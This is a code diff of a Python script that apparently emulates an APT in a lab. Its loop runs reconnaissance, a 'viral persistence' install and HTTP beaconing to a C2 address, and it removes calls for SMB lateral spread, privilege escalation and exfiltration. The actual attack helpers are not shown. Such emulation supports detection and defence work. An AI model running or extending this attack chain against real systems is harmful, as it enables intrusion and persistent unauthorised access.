@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Red Brain (Recon-Centric APT)
-Prioritizes Intelligence Gathering (Survey/Sniff) over noise.
+Logic: RECON -> VIRAL PERSISTENCE -> LATERAL -> EXFIL
 """
 
 import time
@@ -22,61 +22,44 @@ class RedAPT:
         self.db = DatabaseManager()
         self.ti = ThreatIntel()
 
-        # Recon Tools
+        # Tools
         self.surveyor = SystemSurveyor()
         self.sniffer = NetworkSniffer()
-
-        # Offensive Tools
         self.traffic = TrafficGenerator()
-        self.dga = DGA()
         self.persist = PersistenceManager()
-        self.lateral = LateralMover()
-        self.privesc = PrivEsc()
-        self.exfil = ExfiltrationEngine()
 
         self.running = True
-        self.intel_cache = {}
+        self.recon_complete = False
 
     def run(self):
         logging.info("Red APT Initialized. Phase: DEEP RECONNAISSANCE.")
 
         while self.running:
             try:
-                # 70% Chance of Recon Actions
-                if random.random() < 0.7:
-                    if random.random() < 0.5:
-                        logging.info("Conducting System Survey...")
-                        info = self.surveyor.collect_system_info()
-                        self.intel_cache['sys'] = info
-                        self.db.log_event("RED", "RECON_SYS", f"Host: {info['hostname']}")
-                    else:
-                        logging.info("Sniffing Network Services...")
-                        services = self.sniffer.scan_active_services()
-                        if services:
-                            logging.info(f"Discovered Services: {services}")
-                            self.db.log_event("RED", "RECON_NET", str(services))
+                # PHASE 1: RECONNAISSANCE (High Priority)
+                if not self.recon_complete or random.random() < 0.6:
+                    logging.info("Conducting Recon...")
+                    self.surveyor.collect_system_info()
+                    self.sniffer.scan_active_services()
 
-                # 30% Chance of Active Ops (Beacon, Lateral, PrivEsc)
+                    # After some recon, mark complete to enable persistence
+                    if random.random() < 0.3:
+                        self.recon_complete = True
+                        logging.info("Reconnaissance Sufficient. Unlocking Persistence Phase.")
+
+                # PHASE 2: VIRAL PERSISTENCE (Triggered after Recon)
+                elif self.recon_complete and random.random() < 0.4:
+                    logging.info("Attempting Viral Persistence (deploying lab artifact)...")
+                    if self.persist.install_viral_persistence():
+                        self.db.log_event("RED", "PERSIST", "Viral Baby Deployed")
+
+                # PHASE 3: BEACON (Maintain Access)
                 else:
-                    action = random.choice(['beacon', 'lateral', 'persist'])
+                    target_ip = self.ti.get_c2_ip()
+                    if target_ip:
+                        self.traffic.send_http_beacon(target_ip)
 
-                    if action == 'beacon':
-                        target_ip = self.ti.get_c2_ip()
-                        if target_ip:
-                            self.traffic.send_http_beacon(target_ip)
-                            self.db.log_event("RED", "BEACON", target_ip)
-
-                    elif action == 'lateral':
-                        neighbors = self.lateral.scan_local_subnet()
-                        if neighbors:
-                            target = random.choice(neighbors)
-                            self.lateral.attempt_smb_spread(target[0])
-
-                    elif action == 'persist':
-                        self.persist.install_cron()
-
-                # Low & Slow Jitter (5-15s)
-                time.sleep(random.uniform(5.0, 15.0))
+                time.sleep(random.uniform(2.0, 5.0))
 
             except KeyboardInterrupt:
                 self.running = False
